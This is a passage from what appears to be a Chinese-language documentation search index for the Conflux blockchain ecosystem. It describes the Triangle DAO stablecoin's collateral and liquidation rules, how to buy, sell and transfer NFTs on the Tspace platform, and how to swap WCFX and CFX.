Pool\u4e2d\u7684AUSD\u56de\u8d2d\u5f85\u6e05\u7b97\u8d26\u6237\u7684CFX\uff0c\u5e76\u9500\u6bc1\u8d2d\u4e70\u8fd9\u4e9bCFX\u7684AUSD\uff0c\u540c\u65f6\u63d0\u9192\u5408\u7ea6\u9700\u8981\u6e05\u7b97\u7684\u8d26\u6237\u5c06\u83b7\u5f9720AUSD\u7684\u63d0\u9192\u5956\u52b1 \u4e09\u89d2DAO\u4f7f\u7528\u6559\u7a0b \u00b6 \u793e\u7fa4\u70ed\u5fc3\u6210\u5458aloner\u5df2\u63d0\u4f9b\u76f8\u5bf9\u8f83\u4e3a\u5b8c\u5584\u7684\u4e09\u89d2\u9053\u4f7f\u7528\u6559\u7a0b\uff1a Aloner\u8bba\u575b\u6559\u7a0b \u6dfb\u52a0\u4e09\u89d2DAO\u4ee3\u5e01\u5230Portal\u94b1\u5305\u6559\u7a0b \u00b6 Portal\u94b1\u5305\u76ee\u524d\u8fd8\u4e0d\u652f\u6301\u76f4\u63a5\u901a\u8fc7\u540d\u79f0\u641c\u7d22\uff0c\u90a3\u4e48\u53ea\u80fd\u9ebb\u70e6\u4e61\u4eb2\u4eec\u7528\u5408\u7ea6\u5730\u5740\u6dfb\u52a0\u4e86\uff0c\u5408\u7ea6\u5730\u5740\u5728\u54ea\u627e\uff1f\u8bbf\u95ee \u4e09\u89d2\u9053\u5b98\u7f51 \uff0c\u53f3\u4e0a\u89d2\u5373\u53ef\u590d\u5236AUSD\u5408\u7ea6\u5730\u5740\uff0cTAD\u540c\u7406\uff0c\u9f20\u6807\u79fb\u52a8\u8fc7\u53bb\uff0c\u5408\u7ea6\u5730\u5740\u5c31\u51fa\u73b0\u4e86\uff0c\u76f4\u63a5\u590d\u5236\u5c31\u884c\u3002 \u6dfb\u52a0\u901a\u8fc7\u5408\u7ea6\u5730\u5740\u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u94b1\u5305\u6559\u7a0b\u65e9\u5c31\u5199\u597d\u4e86\uff0c \u53c2\u8003\u94fe\u63a5 \u67e5\u770b\u4f7f\u7528\u4e09\u89d2DAO\u5f00\u542f\u6216\u5173\u95ed\u94f6\u884c\u7684\u5386\u53f2 \u00b6 \u8bbf\u95ee \u4e09\u89d2DAO\u9996\u9875 \uff0c\u8fde\u63a5Portal\u94b1\u5305\u540e\u53d1\u73b0\u9875\u9762\u4e2d\u51fa\u73b0\u201cView History\u201d\u6309\u94ae \u70b9\u51fb\u6309\u94ae\u67e5\u770b\u64cd\u4f5c\u5386\u53f2","title":"Triangle DAO"},{"location":"ecosystem/triangledao/#triangle-dao","text":"","title":"Triangle DAO"},{"location":"ecosystem/triangledao/#_1","text":"TriAngleDao(\u793e\u533a\u4e60\u60ef\u79f0\u4e4b\u4e3a\u4e09\u89d2\u9053\uff0c\u7b80\u79f0TAD)\uff0c\u4e09\u89d2\u9053\u662f\u4e00\u4e2a\u57fa\u4e8eCFX\u7684\u7a33\u5b9a\u5e01\u9879\u76ee\u3002\u5176\u4e3b\u8981\u601d\u60f3\u662f\uff0c\u901a\u8fc7\u8d85\u989d\u62b5\u62bcCFX\uff0c\u4ece\u4e09\u89d2\u9053\u5904\u501f\u51fa\u7a33\u5b9a\u5e01AUSD\uff0c\u4e00\u79cd\u4e0e\u7f8e\u51431\uff1a1\u951a\u5b9a\u7684\u94fe\u4e0a\u4ee3\u5e01\u3002\u4e14CFX\u62b5\u62bc\u7387\u4e0d\u5f97\u4f4e\u4e8e110%\u3002\u5373\u6bcf\u4e00\u679aaUSD\u80cc\u540e\u6709\u4e0d\u4f4e\u4e8e\u4ef7\u503c1.1U\u7684CFX\u62b5\u62bc\u3002TriAngle DAO \u662f\u4e00\u6b3e\u5168\u7403\u901a\u7528\u7684\u7a33\u5b9a\u5e01\u534f\u8bae\uff0c\u80fd\u591f\u5728\u4efb\u610f\u4f4d\u7f6e\u7684\u4efb\u610f\u7528\u6237\u5728\u4efb\u610f\u65f6\u523b\u63d0\u4f9b\u5b8c\u5168\u65e0\u606f\u7684\u7a33\u5b9a\u5e01\uff0c\u65e8\u5728\u4e3a\u90a3\u4e9b\u65e0\u6cd5\u4f7f\u7528\u94f6\u884c\u670d\u52a1\u7684\u7528\u6237\u63d0\u4f9b\u7c7b\u4f3c\u94f6\u884c\u7684\u670d\u52a1\u3002\u4ee5Conflux\u7f51\u7edc\u4e3a\u4f8b\uff0cTriAngle DAO\u662f\u4e00\u6b3e\u80fd\u591f\u901a\u8fc7\u62b5\u62bcCFX\u751f\u6210\u7a33\u5b9a\u5e01AUSD\u63d0\u4f9b\u65e0\u606f\u6d41\u52a8\u8d44\u91d1\u7684\u534f\u8bae\u3002\u901a\u8fc7\u8fd0\u7528\u5148\u8fdb\u7684\u6e05\u7b97\u673a\u5236\u548c\u57fa\u4e8e\u7b97\u6cd5\u7684\u8d27\u5e01\u653f\u7b56\uff0c\u80fd\u591f\u4e3a\u501f\u6b3e\u4eba\u63d0\u4f9b\u4e00\u5b9a\u7684\u4f18\u52bf\u548c\u597d\u5904\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/triangledao/#_2","text":"TriAngleDao\u4e3b\u9875","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/triangledao/#_3","text":"","title":"\u9879\u76ee\u7ec6\u8282"},{"location":"ecosystem/triangledao/#_4","text":"TriAngleDao\u7684\u529f\u80fd\u4e3b\u8981\u5305\u62ec\uff1a Dashboard\uff1a\u4eea\u8868\u677f\uff0c\u67e5\u770b\u4e09\u89d2\u9053\u7684\u534f\u8baeTVL\u4fe1\u606f\uff0c\u9501\u4ed3CFX\u91cf\uff0c\u62b5\u62bc\u7387\uff08Total Collateral Ratio\uff09\uff0c\u6062\u590d\u6a21\u5f0f\u7684\u4ef7\u683c\u9608\u503c\uff08Recovery Mode Price Threshold\uff09\u7b49\uff0c\u5982\u679c\u8fde\u63a5Portal\u94b1\u5305\u8fd8\u4f1a\u663e\u793a\u7528\u6237\u81ea\u5df1\u501f\u51faAUSD\u7684\u603b\u91cf\u4fe1\u606f\uff0c\u62b5\u62bc\u7387\u7b49\u91cd\u8981\u4fe1\u606f\u3002 Portal\u5b89\u88c5\u6559\u7a0b\u53ef \u53c2\u8003\u94fe\u63a5 \u3002 TriAngle Bank\uff1a\u62b5\u62bcCFX\u501f\u51faAUSD\uff0c\u5f00\u542f\u94f6\u884c\u3002 Stability Pool\uff1a\u7a33\u5b9a\u5e01\u8d28\u62bc\u6c60\uff0c\u5b58\u5165AUSD\uff0c\u6316\u53d6\u5e73\u53f0\u5e01TAD\uff0c\u5728\u51fa\u73b0\u6e05\u7b97\u65f6\uff0c\u5b58\u5165\u7684AUSD\u6309\u6bd4\u4f8b\u74dc\u5206\u6e05\u7b97CFX\uff08\u4ee5\u4f18\u60e0\u4ef7\u8d2d\u4e70\uff0c\u539f\u56e0\u662f\u88ab\u6e05\u7b97\u8005\u5728\u501f\u51faAUSD\u65f6\u81f3\u5c11\u9700\u8981\u4fdd\u8bc1\u62b5\u62bc\u7684CFX\u5bf9\u5e94\u7684\u62b5\u62bc\u7387\u4e3a110%\uff09 Stake Pool\uff1a\u8d28\u62bc\u6c60\uff0c\u5b58\u5165\u5e73\u53f0\u5e01TAD\uff08\u5e26\u9501\u4ed3\u673a\u5236\uff09\uff0c\u74dc\u5206AUSD\u624b\u7eed\u8d39\uff0cCFX\u53caTAD\u7b49\u4ee3\u5e01\uff0c\u76ee\u524d\u6682\u65f6\u53ea\u53d1\u73b0AUSD\u6709\u4ea7\u51fa Mining Pool\uff1a\u6316\u77ff\u6c60\uff0c\u76ee\u524d\u8fd8\u672a\u5f00\u653e Redemption\uff1a\u5229\u7528AUSD\u8d4e\u56deCFX\uff0c\u4e09\u89d2DAO\u5c06\u4f1a\u6839\u636e\u8d26\u6237\u62b5\u62bc\u7387\u7684\u60c5\u51b5\uff0c\u7531\u62b5\u62bc\u7387\u4f4e->\u62b5\u62bc\u7387\u9ad8\u8fdb\u884c\u6392\u5e8f\uff0c\u5229\u7528AUSD\u507f\u8fd8\u5bf9\u5e94\u8d26\u6237\u7684AUSD\u503a\u52a1\uff0c\u4ee5\u6362\u53d6\u5bf9\u5e94\u8d26\u6237\u7684\u62b5\u62bc\u7269 Liquidation\uff1a\u6e05\u7b97\uff0c\u5728\u6709\u8d26\u6237\u62b5\u62bc\u7387\u8fc7\u4f4e\u65f6\uff0c\u901a\u8fc7\u70b9\u51fb\u6309\u94ae\uff0c\u63d0\u9192\u4e09\u89d2\u9053\u6709\u8d26\u6237\u9700\u8981\u6e05\u7b97\u4e86\uff0c\u8fd9\u65f6\u4e09\u89d2dao\u4f1a\u5229\u7528\u62b5\u62bc\u5728Stability Pool\u4e2d\u7684AUSD\u56de\u8d2d\u5f85\u6e05\u7b97\u8d26\u6237\u7684CFX\uff0c\u5e76\u9500\u6bc1\u8d2d\u4e70\u8fd9\u4e9bCFX\u7684AUSD\uff0c\u540c\u65f6\u63d0\u9192\u5408\u7ea6\u9700\u8981\u6e05\u7b97\u7684\u8d26\u6237\u5c06\u83b7\u5f9720AUSD\u7684\u63d0\u9192\u5956\u52b1","title":"\u751f\u6001\u529f\u80fd\u4ecb\u7ecd"},{"location":"ecosystem/triangledao/#dao","text":"\u793e\u7fa4\u70ed\u5fc3\u6210\u5458aloner\u5df2\u63d0\u4f9b\u76f8\u5bf9\u8f83\u4e3a\u5b8c\u5584\u7684\u4e09\u89d2\u9053\u4f7f\u7528\u6559\u7a0b\uff1a Aloner\u8bba\u575b\u6559\u7a0b","title":"\u4e09\u89d2DAO\u4f7f\u7528\u6559\u7a0b"},{"location":"ecosystem/triangledao/#daoportal","text":"Portal\u94b1\u5305\u76ee\u524d\u8fd8\u4e0d\u652f\u6301\u76f4\u63a5\u901a\u8fc7\u540d\u79f0\u641c\u7d22\uff0c\u90a3\u4e48\u53ea\u80fd\u9ebb\u70e6\u4e61\u4eb2\u4eec\u7528\u5408\u7ea6\u5730\u5740\u6dfb\u52a0\u4e86\uff0c\u5408\u7ea6\u5730\u5740\u5728\u54ea\u627e\uff1f\u8bbf\u95ee \u4e09\u89d2\u9053\u5b98\u7f51 \uff0c\u53f3\u4e0a\u89d2\u5373\u53ef\u590d\u5236AUSD\u5408\u7ea6\u5730\u5740\uff0cTAD\u540c\u7406\uff0c\u9f20\u6807\u79fb\u52a8\u8fc7\u53bb\uff0c\u5408\u7ea6\u5730\u5740\u5c31\u51fa\u73b0\u4e86\uff0c\u76f4\u63a5\u590d\u5236\u5c31\u884c\u3002 \u6dfb\u52a0\u901a\u8fc7\u5408\u7ea6\u5730\u5740\u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u94b1\u5305\u6559\u7a0b\u65e9\u5c31\u5199\u597d\u4e86\uff0c \u53c2\u8003\u94fe\u63a5","title":"\u6dfb\u52a0\u4e09\u89d2DAO\u4ee3\u5e01\u5230Portal\u94b1\u5305\u6559\u7a0b"},{"location":"ecosystem/triangledao/#dao_1","text":"\u8bbf\u95ee \u4e09\u89d2DAO\u9996\u9875 \uff0c\u8fde\u63a5Portal\u94b1\u5305\u540e\u53d1\u73b0\u9875\u9762\u4e2d\u51fa\u73b0\u201cView History\u201d\u6309\u94ae \u70b9\u51fb\u6309\u94ae\u67e5\u770b\u64cd\u4f5c\u5386\u53f2","title":"\u67e5\u770b\u4f7f\u7528\u4e09\u89d2DAO\u5f00\u542f\u6216\u5173\u95ed\u94f6\u884c\u7684\u5386\u53f2"},{"location":"ecosystem/tspace/","text":"Tspace 4.0 NFT\u5e73\u53f0 \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Tspace\u662f\u9996\u4e2a\u57fa\u4e8e\u6811\u56fe\uff08Conflux\uff09\u533a\u5757\u94fe\u7f51\u7edc\u7684\u53bb\u4e2d\u5fc3\u5316\u6570\u5b57\u8d44\u4ea7\u4ea4\u6613\u5e73\u53f0\uff0c\u80fd\u591f\u670d\u52a1\u4e8e\u591a\u65b9\u5ba2\u6237\u7ba1\u7406\u6570\u5b57\u6536\u85cf\u54c1NFT\uff08Non-Fungible Token\uff09\u7684\u9700\u6c42\u3002NFT\u5177\u6709\u72ec\u4e00\u65e0\u4e8c\u3001\u7a00\u7f3a\u6027\u3001\u4e0d\u53ef\u590d\u5236\u7684\u72ec\u7279\u5c5e\u6027\uff0c\u53ef\u5e94\u7528\u4e8e\u591a\u79cd\u865a\u62df\u4e0e\u73b0\u5b9e\u5e94\u7528\u573a\u666f\u3002Tspace\u51ed\u501fConflux\u7f51\u7edc\u9ad8\u901f\u3001\u5b89\u5168\u3001\u4f4e\u6210\u672c\u7684\u6280\u672f\u4f18\u52bf\uff0c\u80fd\u591f\u66f4\u597d\u5730\u652f\u6301NFT\u7684\u94f8\u9020\u3001\u5c55\u793a\u548c\u6d41\u901a\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u5f00\u653e\u548c\u5305\u5bb9\u7684\u7efc\u5408\u7ba1\u7406\u5e73\u53f0\uff0c\u548c\u4e00\u4e2a\u5065\u5eb7\u7e41\u8363\u7684\u5546\u54c1\u5e02\u573a\u6570\u5b57\u6570\u5b57\u7ecf\u6d4e\u3002\u4f5c\u4e3a\u4e00\u4e2a\u7eaf\u7531Conflux\u6280\u672f\u793e\u533a\u5b75\u5316\u7684\u751f\u6001\u9879\u76ee\uff0cTspace\u56e2\u961f\u901a\u8fc7\u521b\u65b0\u6280\u672f\u548c\u5e73\u53f0\u4f18\u52bf\u4e3a\u52a0\u5bc6\u827a\u672f\u5bb6\u53ca\u6536\u85cf\u8005\u4eec\u63d0\u4f9b\u4e00\u4e2a\u4f18\u8d28\u7684\u6570\u5b57\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0\uff0c\u5efa\u7acbConflux\u94fe\u4e0a\u975e\u540c\u8d28\u5316\u7684\u53ef\u64cd\u4f5c\u5408\u7ea6\u6807\u51c6\uff0c\u4e3a\u5f00\u53d1\u8005\uff0c\u827a\u672f\u5bb6\u3001\u6709\u60f3\u6cd5\u7684\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u5de5\u5177\u548c\u96c6\u6210\u5e02\u573a\u3002Tspace\u56e2\u961f\u81f4\u529b\u4e8e\u63a2\u7d22\u548c\u5b9e\u8df5\u666e\u53ca\u533a\u5757\u94fe\u6280\u672f\u7684\u65b9\u6cd5\uff0c\u5f15\u5bfc\u4eba\u4eec\u8d70\u8fdb\u795e\u5947\u7684\u52a0\u5bc6\u827a\u672f\u4e16\u754c\uff0c\u4eab\u53d7\u79d1\u6280\u7ed9\u751f\u6d3b\u5e26\u6765\u7684\u6539\u53d8\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 Tspace--\u6570\u5b57\u8d44\u4ea7\u7efc\u5408\u5e73\u53f0 \u4f7f\u7528Conflux Portal\u63a5\u5165Tspace \u00b6 Note \u200b Conflux Portal\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\u94b1\u5305\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee Tspace\u9996\u9875 \u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u94fe\u63a5\u94b1\u5305\u201d\u6309\u94ae \u6388\u6743\u6210\u529f\u540e\uff0c\u5373\u4ee3\u8868\u5bf9\u5e94\u94b1\u5305\u5730\u5740\u63a5\u5165Tspace\u6210\u529f\u3002 \u4f7f\u7528Tspace\u4ee5\u4e00\u53e3\u4ef7\u5f62\u5f0f\u552e\u5356\u94b1\u5305\u5185\u5df2\u6709NFT \u00b6 \u5f53\u94b1\u5305\u63a5\u5165Tspace\u540e\uff0c\u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u4e2a\u4eba\u4e2d\u5fc3\u201d\u56fe\u6807 \u901a\u8fc7\u4e2a\u4eba\u4e2d\u5fc3\u53ef\u67e5\u770b\u5230\u5f53\u524d\u94b1\u5305\u5730\u5740\u6240\u6301\u6709\u7684NFT\uff1a \u70b9\u51fbNFT\u4e0b\u9762\u7684\u201c\u53d1\u552e\u201d\u6309\u94ae\uff0c\u53ef\u51fa\u552e\u81ea\u5df1\u6301\u6709\u7684NFT \u4ee5\u4e00\u53e3\u4ef7\u6a21\u5f0f\u51fa\u552e\uff0c\u5373\u4ee3\u8868\u5fc5\u987b\u4ed8\u51fa\u8bbe\u7f6e\u7684\u4ef7\u683c\uff0c\u624d\u80fd\u4e70\u4e0b\u8be5NFT\uff0c\u5982\u8bbe\u7f6e\u4e3a999999CUSDT\u4ef7\u683c\uff0c\u5373\u4ed6\u4eba\u9700\u8981\u652f\u4ed8999999CUSDT\u624d\u80fd\u4e70\u5230\u8be5NFT\u3002 \u70b9\u51fb\u4e0a\u56fe\u786e\u8ba4\u6309\u94ae\u540e\uff0c\u5f39\u51fa\u201c\u786e\u8ba4\u53d1\u552e\u201d\u754c\u9762 \u70b9\u51fb\u201c\u53d1\u552e\u6309\u94ae\u201d\uff0c\u4f1a\u5f39\u51fa\u201c\u7b7e\u540d\u201d->\u201c\u6388\u6743\u201d \u7b7e\u540d\u4f1a\u53d1\u8d77\u4e00\u4e2aPortal\u4ea4\u6613\uff0c\u786e\u8ba4\u5373\u53ef\uff0c\u6388\u6743\u540c\u7406\uff0c\u71c3\u6c14\u8d39\u7528\u7531conflux\u4ee3\u4ed8 \u5237\u65b0\u9875\u9762\u53ef\u770b\u5230\u51fa\u552e\u72b6\u6001 \u4f7f\u7528Tspace\u4ee5\u62cd\u5356\u5f62\u5f0f\u552e\u5356\u94b1\u5305\u5185NFT \u00b6 \u5728\u4e0a\u67b6\u9500\u552e\u65f6\uff0c\u9009\u62e9\u201c\u6700\u9ad8\u7ade\u4ef7\u201d\uff0c\u8bbe\u7f6e\u8d77\u62cd\u4ef7\u548c\u622a\u81f3\u65e5\u671f \u7ade\u62cd\u65f6\u95f4\u53ef\u9009\u62e924,48\u621672\u5c0f\u65f6 \u4f7f\u7528Tspace\u8d2d\u4e70NFT\uff08\u4e00\u53e3\u4ef7/\u7ade\u62cd\uff09 \u00b6 \u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u4ea4\u6613\u5e02\u573a\u201d\uff0c\u67e5\u770b\u6b63\u5728\u51fa\u552e\u7684NFT \u53ef\u901a\u8fc7\u7b5b\u9009\u529f\u80fd\u7b5b\u9009\u611f\u5174\u8da3\u7684NFT \u7ade\u4ef7\u6a21\u5f0f\uff0c\u4e0d\u4f1a\u7acb\u5373\u652f\u4ed8\u8d39\u7528\uff0c\u53ea\u9700\u786e\u4fdd\u94b1\u5305\u91cc\u6709\u8db3\u591f\u7684\u4f59\u989d\u8db3\u4ee5\u652f\u4ed8NFT\u8d39\u7528\uff0c\u5f85\u62cd\u5356\u7ed3\u675f\u540e\u4f1a\u81ea\u52a8\u62b5\u6263\u6b3e\u9879 \u4e00\u53e3\u4ef7\u6a21\u5f0f\uff1a\u4ea4\u6613\u76ee\u5f55\u4e0bNFT\u53ef\u4ee5\u76f4\u63a5\u4e00\u53e3\u4ef7\u8d2d\u4e70 NFT\u8f6c\u8d26 \u00b6 tspace\u652f\u6301NFT\u8f6c\u8d26\u7ed9\u4efb\u610fConflux\u5408\u6cd5\u94b1\u5305\u5730\u5740\uff0cNFT\u53f3\u4e0a\u89d2\u6709\u4e00\u4e2a\u6309\u94ae\uff0c\u70b9\u4ed6 \u586b\u5199\u5730\u5740\uff0c\u70b9\u786e\u8ba4\u6309\u94ae\uff0c\u6ce8\u610f\u4e0d\u8981\u586b\u5199\u5408\u7ea6\u5730\u5740","title":"Tspace 4.0 NFT\u5e73\u53f0"},{"location":"ecosystem/tspace/#tspace-40-nft","text":"","title":"Tspace 4.0 NFT\u5e73\u53f0"},{"location":"ecosystem/tspace/#_1","text":"Tspace\u662f\u9996\u4e2a\u57fa\u4e8e\u6811\u56fe\uff08Conflux\uff09\u533a\u5757\u94fe\u7f51\u7edc\u7684\u53bb\u4e2d\u5fc3\u5316\u6570\u5b57\u8d44\u4ea7\u4ea4\u6613\u5e73\u53f0\uff0c\u80fd\u591f\u670d\u52a1\u4e8e\u591a\u65b9\u5ba2\u6237\u7ba1\u7406\u6570\u5b57\u6536\u85cf\u54c1NFT\uff08Non-Fungible Token\uff09\u7684\u9700\u6c42\u3002NFT\u5177\u6709\u72ec\u4e00\u65e0\u4e8c\u3001\u7a00\u7f3a\u6027\u3001\u4e0d\u53ef\u590d\u5236\u7684\u72ec\u7279\u5c5e\u6027\uff0c\u53ef\u5e94\u7528\u4e8e\u591a\u79cd\u865a\u62df\u4e0e\u73b0\u5b9e\u5e94\u7528\u573a\u666f\u3002Tspace\u51ed\u501fConflux\u7f51\u7edc\u9ad8\u901f\u3001\u5b89\u5168\u3001\u4f4e\u6210\u672c\u7684\u6280\u672f\u4f18\u52bf\uff0c\u80fd\u591f\u66f4\u597d\u5730\u652f\u6301NFT\u7684\u94f8\u9020\u3001\u5c55\u793a\u548c\u6d41\u901a\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u5f00\u653e\u548c\u5305\u5bb9\u7684\u7efc\u5408\u7ba1\u7406\u5e73\u53f0\uff0c\u548c\u4e00\u4e2a\u5065\u5eb7\u7e41\u8363\u7684\u5546\u54c1\u5e02\u573a\u6570\u5b57\u6570\u5b57\u7ecf\u6d4e\u3002\u4f5c\u4e3a\u4e00\u4e2a\u7eaf\u7531Conflux\u6280\u672f\u793e\u533a\u5b75\u5316\u7684\u751f\u6001\u9879\u76ee\uff0cTspace\u56e2\u961f\u901a\u8fc7\u521b\u65b0\u6280\u672f\u548c\u5e73\u53f0\u4f18\u52bf\u4e3a\u52a0\u5bc6\u827a\u672f\u5bb6\u53ca\u6536\u85cf\u8005\u4eec\u63d0\u4f9b\u4e00\u4e2a\u4f18\u8d28\u7684\u6570\u5b57\u8d44\u4ea7\u7ba1\u7406\u5e73\u53f0\uff0c\u5efa\u7acbConflux\u94fe\u4e0a\u975e\u540c\u8d28\u5316\u7684\u53ef\u64cd\u4f5c\u5408\u7ea6\u6807\u51c6\uff0c\u4e3a\u5f00\u53d1\u8005\uff0c\u827a\u672f\u5bb6\u3001\u6709\u60f3\u6cd5\u7684\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u5de5\u5177\u548c\u96c6\u6210\u5e02\u573a\u3002Tspace\u56e2\u961f\u81f4\u529b\u4e8e\u63a2\u7d22\u548c\u5b9e\u8df5\u666e\u53ca\u533a\u5757\u94fe\u6280\u672f\u7684\u65b9\u6cd5\uff0c\u5f15\u5bfc\u4eba\u4eec\u8d70\u8fdb\u795e\u5947\u7684\u52a0\u5bc6\u827a\u672f\u4e16\u754c\uff0c\u4eab\u53d7\u79d1\u6280\u7ed9\u751f\u6d3b\u5e26\u6765\u7684\u6539\u53d8\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"ecosystem/tspace/#_2","text":"Tspace--\u6570\u5b57\u8d44\u4ea7\u7efc\u5408\u5e73\u53f0","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/tspace/#conflux-portaltspace","text":"Note \u200b Conflux Portal\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\u94b1\u5305\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee Tspace\u9996\u9875 \u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u94fe\u63a5\u94b1\u5305\u201d\u6309\u94ae \u6388\u6743\u6210\u529f\u540e\uff0c\u5373\u4ee3\u8868\u5bf9\u5e94\u94b1\u5305\u5730\u5740\u63a5\u5165Tspace\u6210\u529f\u3002","title":"\u4f7f\u7528Conflux Portal\u63a5\u5165Tspace"},{"location":"ecosystem/tspace/#tspacenft","text":"\u5f53\u94b1\u5305\u63a5\u5165Tspace\u540e\uff0c\u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u4e2a\u4eba\u4e2d\u5fc3\u201d\u56fe\u6807 \u901a\u8fc7\u4e2a\u4eba\u4e2d\u5fc3\u53ef\u67e5\u770b\u5230\u5f53\u524d\u94b1\u5305\u5730\u5740\u6240\u6301\u6709\u7684NFT\uff1a \u70b9\u51fbNFT\u4e0b\u9762\u7684\u201c\u53d1\u552e\u201d\u6309\u94ae\uff0c\u53ef\u51fa\u552e\u81ea\u5df1\u6301\u6709\u7684NFT \u4ee5\u4e00\u53e3\u4ef7\u6a21\u5f0f\u51fa\u552e\uff0c\u5373\u4ee3\u8868\u5fc5\u987b\u4ed8\u51fa\u8bbe\u7f6e\u7684\u4ef7\u683c\uff0c\u624d\u80fd\u4e70\u4e0b\u8be5NFT\uff0c\u5982\u8bbe\u7f6e\u4e3a999999CUSDT\u4ef7\u683c\uff0c\u5373\u4ed6\u4eba\u9700\u8981\u652f\u4ed8999999CUSDT\u624d\u80fd\u4e70\u5230\u8be5NFT\u3002 \u70b9\u51fb\u4e0a\u56fe\u786e\u8ba4\u6309\u94ae\u540e\uff0c\u5f39\u51fa\u201c\u786e\u8ba4\u53d1\u552e\u201d\u754c\u9762 \u70b9\u51fb\u201c\u53d1\u552e\u6309\u94ae\u201d\uff0c\u4f1a\u5f39\u51fa\u201c\u7b7e\u540d\u201d->\u201c\u6388\u6743\u201d \u7b7e\u540d\u4f1a\u53d1\u8d77\u4e00\u4e2aPortal\u4ea4\u6613\uff0c\u786e\u8ba4\u5373\u53ef\uff0c\u6388\u6743\u540c\u7406\uff0c\u71c3\u6c14\u8d39\u7528\u7531conflux\u4ee3\u4ed8 \u5237\u65b0\u9875\u9762\u53ef\u770b\u5230\u51fa\u552e\u72b6\u6001","title":"\u4f7f\u7528Tspace\u4ee5\u4e00\u53e3\u4ef7\u5f62\u5f0f\u552e\u5356\u94b1\u5305\u5185\u5df2\u6709NFT"},{"location":"ecosystem/tspace/#tspacenft_1","text":"\u5728\u4e0a\u67b6\u9500\u552e\u65f6\uff0c\u9009\u62e9\u201c\u6700\u9ad8\u7ade\u4ef7\u201d\uff0c\u8bbe\u7f6e\u8d77\u62cd\u4ef7\u548c\u622a\u81f3\u65e5\u671f \u7ade\u62cd\u65f6\u95f4\u53ef\u9009\u62e924,48\u621672\u5c0f\u65f6","title":"\u4f7f\u7528Tspace\u4ee5\u62cd\u5356\u5f62\u5f0f\u552e\u5356\u94b1\u5305\u5185NFT"},{"location":"ecosystem/tspace/#tspacenft_2","text":"\u70b9\u51fb\u53f3\u4e0a\u89d2\u201c\u4ea4\u6613\u5e02\u573a\u201d\uff0c\u67e5\u770b\u6b63\u5728\u51fa\u552e\u7684NFT \u53ef\u901a\u8fc7\u7b5b\u9009\u529f\u80fd\u7b5b\u9009\u611f\u5174\u8da3\u7684NFT \u7ade\u4ef7\u6a21\u5f0f\uff0c\u4e0d\u4f1a\u7acb\u5373\u652f\u4ed8\u8d39\u7528\uff0c\u53ea\u9700\u786e\u4fdd\u94b1\u5305\u91cc\u6709\u8db3\u591f\u7684\u4f59\u989d\u8db3\u4ee5\u652f\u4ed8NFT\u8d39\u7528\uff0c\u5f85\u62cd\u5356\u7ed3\u675f\u540e\u4f1a\u81ea\u52a8\u62b5\u6263\u6b3e\u9879 \u4e00\u53e3\u4ef7\u6a21\u5f0f\uff1a\u4ea4\u6613\u76ee\u5f55\u4e0bNFT\u53ef\u4ee5\u76f4\u63a5\u4e00\u53e3\u4ef7\u8d2d\u4e70","title":"\u4f7f\u7528Tspace\u8d2d\u4e70NFT\uff08\u4e00\u53e3\u4ef7/\u7ade\u62cd\uff09"},{"location":"ecosystem/tspace/#nft","text":"tspace\u652f\u6301NFT\u8f6c\u8d26\u7ed9\u4efb\u610fConflux\u5408\u6cd5\u94b1\u5305\u5730\u5740\uff0cNFT\u53f3\u4e0a\u89d2\u6709\u4e00\u4e2a\u6309\u94ae\uff0c\u70b9\u4ed6 \u586b\u5199\u5730\u5740\uff0c\u70b9\u786e\u8ba4\u6309\u94ae\uff0c\u6ce8\u610f\u4e0d\u8981\u586b\u5199\u5408\u7ea6\u5730\u5740","title":"NFT\u8f6c\u8d26"},{"location":"ecosystem/wcfx-cfx-exchange/","text":"WCFX\u4e0eCFX\u4ee3\u5e01\u4e92\u6362 \u00b6 WCFX\u4ecb\u7ecd \u00b6 WCFX\u662f\u7ecf\u8fc7CRC20 wrapped\u5904\u7406\u8fc7\u7684CFX\uff0c\u539f\u5219\u4e0aWCFX\u4e0eCFX\u6309\u71671:1\u6bd4\u7387\u8fdb\u884c\u5151\u6362\uff0c\u901a\u5e38\u5728\u4f7f\u7528Tspace\u8fd9\u7c7b\u751f\u6001\u8d2d\u4e70\u7279\u5b9aNFT\u65f6\uff0c\u9700\u8981\u4f7f\u7528WCFX\u4f5c\u4e3a\u652f\u4ed8\u5e01\u79cd\u3002 WCFX\u4ee3\u5e01\u53ef\u901a\u8fc7Confluxscan\u67e5\u770b\uff1a Wrapped Conflux \u9700\u8981\u914d\u7f6eConfluxPortal\uff0c \u914d\u7f6e\u6559\u7a0b CFX\u4e0eWCFX\u4e92\u6362\u7684\u4e24\u79cd\u65b9\u5f0f \u00b6 \u4f7f\u7528Confluxscan\u81ea\u5e26cfx-wcfx\u5151\u6362\u5668\u8fdb\u884c\u5151\u6362\uff1a \u5151\u6362\u94fe\u63a5 \u4f7f\u7528moonswap\u7684swap\u7cfb\u7edf\u8fdb\u884c\u5151\u6362\uff1a \u5151\u6362\u94fe\u63a5 